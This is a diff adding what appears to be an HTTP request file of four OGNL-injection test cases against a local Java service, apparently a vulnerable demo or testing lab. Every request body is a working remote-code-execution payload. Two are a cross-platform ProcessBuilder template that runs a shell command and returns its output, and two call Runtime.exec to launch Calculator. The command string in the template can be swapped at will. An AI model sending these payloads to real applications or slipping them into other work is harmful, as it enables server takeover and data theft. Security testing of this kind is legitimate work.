@@ -1,0 +1,38 @@
+###
+# case1 ognlGetValue
+POST /ognl/case1 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))
+
+
+###
+# case2 ognlSetValue
+POST /ognl/case2 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))(a)(b)
+
+
+###
+# case3 ognlGetValueIbatis
+POST /ognl/case3 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#inputStream=#process.getInputStream()).(@org.apache.commons.io.IOUtils@toString(#inputStream,'UTF-8'))
+
+
+###
+# case4 ognlSetValueIbatis
+POST /ognl/case4 HTTP/1.1
+Host: 127.0.0.1:8080
+Content-Type: text/plain
+
+(@java.lang.Runtime@getRuntime().exec('open -a Calculator.app'))(a)(b)
+
+
+
+
